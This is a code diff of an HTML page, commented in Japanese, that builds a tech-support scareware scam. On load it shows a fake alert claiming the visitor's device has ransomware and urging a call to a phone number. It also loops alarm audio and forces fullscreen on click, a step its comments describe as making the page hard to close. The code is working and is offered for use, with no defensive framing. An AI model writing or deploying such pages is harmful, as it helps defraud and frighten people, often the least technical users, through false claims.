@@ -22,19 +22,22 @@
   <!-- 音声ファイルを2つ同時に挿入 -->
   <!-- autoplay & loop で勝手に再生し続ける -->
   <!-- 例：生ファイルに直接アクセスできるURLを使ってください -->
-<audio id="alert-audio1" 
-       src="https://raw.githubusercontent.com/krkm1234/ioexception.java/main/alert-audio1.mp3"
-       autoplay loop preload="auto">
-</audio>
-<audio id="alert-audio2" 
-       src="https://raw.githubusercontent.com/krkm1234/ioexception.java/main/alert-audio2.mp3"
-       autoplay loop preload="auto">
-</audio>
+  <audio id="alert-audio1" 
+         src="https://raw.githubusercontent.com/krkm1234/ioexception.java/main/alert-audio1.mp3"
+         autoplay loop preload="auto">
+  </audio>
+  <audio id="alert-audio2" 
+         src="https://raw.githubusercontent.com/krkm1234/ioexception.java/main/alert-audio2.mp3"
+         autoplay loop preload="auto">
+  </audio>
 
   <!-- JavaScript（ここではHTML内に記載） -->
   <script>
-    // ページ読込完了時、音声を事前ロードする例
+    // ページ読込完了時にエラーポップアップを表示し、音声を事前ロードする
     window.addEventListener('load', () => {
+      // ★ ここでエラーポップアップを出す
+      alert("エラーが発生しました！\n\nお使いの端末はランサムウェアに感染しています。\n\nただちに 070-1371-8527 までご連絡ください。");
+
       const audioEl1 = document.getElementById('alert-audio1');
       const audioEl2 = document.getElementById('alert-audio2');
       audioEl1.load(); 
@@ -70,17 +73,19 @@
     document.addEventListener('dragstart', function(e) {
       e.preventDefault();
     });
+
+    // 画面クリックでフルスクリーン化（閉じにくくする演出）
     function goFullscreen() {
-  const el = document.documentElement;
-  if (el.requestFullscreen) {
-    el.requestFullscreen();
-  } else if (el.webkitRequestFullscreen) {
-    el.webkitRequestFullscreen();
-  } else if (el.msRequestFullscreen) {
-    el.msRequestFullscreen();
-  }
-}
-document.addEventListener('click', goFullscreen);
+      const el = document.documentElement;
+      if (el.requestFullscreen) {
+        el.requestFullscreen();
+      } else if (el.webkitRequestFullscreen) {
+        el.webkitRequestFullscreen();
+      } else if (el.msRequestFullscreen) {
+        el.msRequestFullscreen();
+      }
+    }
+    document.addEventListener('click', goFullscreen);
 
     /*
      * 3. ブラウザのAutoplayポリシー対策で、クリック時に再生を呼び出す
